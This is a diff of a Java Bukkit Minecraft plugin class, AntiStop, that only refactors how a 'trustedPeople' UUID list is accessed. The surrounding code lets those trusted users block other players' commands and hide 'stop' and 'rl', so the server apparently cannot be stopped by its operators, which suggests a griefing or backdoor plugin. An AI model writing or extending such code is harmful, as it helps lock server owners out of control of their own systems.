@@ -27,7 +27,7 @@ public class AntiStop extends Command {
             p.sendMessage(Start.COMMAND_PREFIX + "§cServer now can be stopped!");
             this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " disabled AntiConsole!");
             for (Player r : Bukkit.getOnlinePlayers()) {
-                if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
+                if (this.plugin.trustedPeople.contains(r.getUniqueId())) continue;
                 if (r.isDead()) return;
                 r.updateCommands();
             }
@@ -45,7 +45,7 @@ public class AntiStop extends Command {
         p.sendMessage(Start.COMMAND_PREFIX + "§aServer now can not be stopped!");
         this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled AntiStop with mode : " + method.toString() + " !");
         for (Player r : Bukkit.getOnlinePlayers()) {
-            if (Start.Instance.trustedPeople.contains(r.getUniqueId())) continue;
+            if (this.plugin.trustedPeople.contains(r.getUniqueId())) continue;
             if (r.isDead()) return;
             r.updateCommands();
         }
@@ -69,7 +69,7 @@ public class AntiStop extends Command {
     @Override
     public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
         try {
-            if (!isActive && Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) {
+            if (!isActive && this.plugin.trustedPeople.contains(e.getPlayer().getUniqueId())) {
                 return;
             }
             String command = e.getMessage().split(" ")[0];
@@ -91,14 +91,14 @@ public class AntiStop extends Command {
         CommandSender sender = e.getSender();
         if (!(sender instanceof Player)) return;
         Player r = (Player) sender;
-        if (!isActive && Start.Instance.trustedPeople.contains(r.getUniqueId())) return;
+        if (!isActive && this.plugin.trustedPeople.contains(r.getUniqueId())) return;
         e.setCancelled(true);
     }
 
     @Override
     public void onPlayerTab(PlayerCommandSendEvent e) {
         if (!this.isActive) return;
-        if (Start.Instance.trustedPeople.contains(e.getPlayer().getUniqueId())) return;
+        if (this.plugin.trustedPeople.contains(e.getPlayer().getUniqueId())) return;
         List<String> blockedCommands = new ArrayList<>();
         blockedCommands.add("stop");
         blockedCommands.add("rl");
